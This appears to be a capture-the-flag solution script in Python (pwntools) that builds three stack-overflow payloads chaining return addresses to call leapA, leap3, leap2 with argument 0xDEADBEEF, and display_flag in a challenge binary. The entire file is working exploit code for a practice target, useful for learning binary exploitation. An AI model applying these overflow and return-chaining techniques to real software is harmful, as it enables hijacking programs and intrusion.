from pwn import *

"""
Target function call order:
leapA() - 0x80485e6
leap3() in the middle of the function - 0x8048690
leap2() with argument 0xDEADBEEF - 0x080485fd
display_flag() - 0x80486b3
"""

# Buf + Padding = 24
exploit1 = 'a'*24
# ebp
exploit1 += 'b'*4

# First eip = leapA
exploit1 += p32(0x080485e6)

# Jump back to vuln to reset esp and ebp
exploit1 += p32(0x08048791)

# ---------------------------------------

# Jump immediately back to the start of vuln to push ebx (ebp-0x4) to the stack
exploit2 = 'a'*24 + 'b'*4
exploit2 += p32(0x08048794)

# ---------------------------------------

# Buf + Padding = 24
exploit3 = 'a'*24
# ebp
exploit3 += 'b'*4

# Second eip = leap3 in middle
exploit3 += p32(0x08048690)

# Manually push ebp because the function doesn't push it
exploit3 += 'b'*4

# Third eip = leap2 with argument 0xDEADBEEF
exploit3 += p32(0x080485fd)

# Jump back to leapA to clear 0xDEADBEEF argument from stack
exploit3 += p32(0x080485fb)
exploit3 += p32(0xDEADBEEF)

# Final eip = display_flag
exploit3 += p32(0x080486b3)

# Actually one more eip to exit without errors
exploit3 += p32(0x080486f6)


print(exploit1 + "\n" + exploit2 + "\n" + exploit3)
